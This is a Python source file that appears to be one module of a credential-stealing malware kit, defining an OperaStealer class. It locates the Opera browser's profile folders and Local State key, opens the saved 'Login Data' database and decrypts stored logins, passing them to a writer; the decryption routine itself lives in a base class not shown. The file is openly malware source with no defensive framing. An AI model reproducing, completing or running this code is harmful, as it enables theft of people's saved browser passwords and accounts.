from modules.stealer.stealers.stealerbase import StealerBase

import os
import re

class OperaStealer(StealerBase):

    PATH = os.path.normpath(rf"{os.environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera Stable")
    LOCAL_STATE = os.path.normpath(rf"{os.environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera Stable\Local State")

    def steal(self, writer):
        key = self.get_secret_key()
        if not key:
            return {"error": "Secret key cannot be accessed"}

        login_db = os.path.normpath(r"%s\Login Data"%(self.__class__.PATH))
        conn = self.get_db_connection(login_db)
        if not conn:
            return {"error": "Database not found"}
        cursor = conn.cursor()
        self.decrypt_database(cursor, key, writer)
        
        return True

    def get_data_folders(self):
        return [element for element in os.listdir(self.__class__.PATH) if re.search("^Profile*|^Default$",element)!=None]
